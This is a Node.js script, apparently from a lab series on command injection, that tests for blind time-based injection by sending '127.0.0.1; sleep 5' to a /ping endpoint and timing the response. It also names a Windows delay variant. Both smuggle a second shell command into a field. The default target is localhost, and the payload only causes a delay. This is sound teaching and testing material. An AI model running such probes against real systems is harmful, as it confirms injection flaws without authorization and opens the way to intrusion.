/*
 * ATTACK 3 — Blind / time-based
 * -----------------------------------------------------------------------------
 * Technique: sometimes a target does not reflect command output back to you
 *   ("blind" injection). You can still PROVE the command ran by making the
 *   server pause, then measuring the HTTP response time. `; sleep 5` makes the
 *   shell sleep for 5 seconds before responding.
 *   (Windows equivalent: `& ping -n 6 127.0.0.1 >NUL` as a crude delay.)
 *
 * Root cause: identical to attacks 1–2 — our text reaches a shell. Here we do
 *   not care about output, only about the observable side effect (elapsed time),
 *   which is enough to confirm code execution even when nothing is echoed.
 *
 * Proof: baseline request (~fast) vs injected `; sleep 5` request (>= 5s). A
 *   large, deliberate delta proves our command executed.
 *
 * Usage: see attack 1 (TARGET env / argv override).
 */

const TARGET = process.env.TARGET || process.argv[2] || 'http://localhost:3000';

async function timedRequest(label, host) {
  const start = process.hrtime.bigint();
  const res = await fetch(`${TARGET}/ping`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ host }),
  });
  await res.text(); // drain body
  const ms = Number(process.hrtime.bigint() - start) / 1e6;
  console.log(`${label.padEnd(28)} host=${JSON.stringify(host).padEnd(22)} -> ${ms.toFixed(0)} ms (HTTP ${res.status})`);
  return ms;
}

(async () => {
  console.log('== Attack 3: blind / time-based ==');
  console.log('Target:', TARGET);
  try {
    const baseline = await timedRequest('baseline (plain ping)', '127.0.0.1');
    const injected = await timedRequest('injected (; sleep 5)', '127.0.0.1; sleep 5');
    const delta = injected - baseline;
    console.log('\nDelta:', delta.toFixed(0), 'ms');
    if (delta >= 4000) {
      console.log('RESULT: injection CONFIRMED — the ~5s delay proves `sleep 5` executed.');
    } else {
      console.log('RESULT: no significant delay — injection did NOT execute (expected on secure server).');
    }
  } catch (e) {
    console.error('request failed:', e.message);
  }
})();
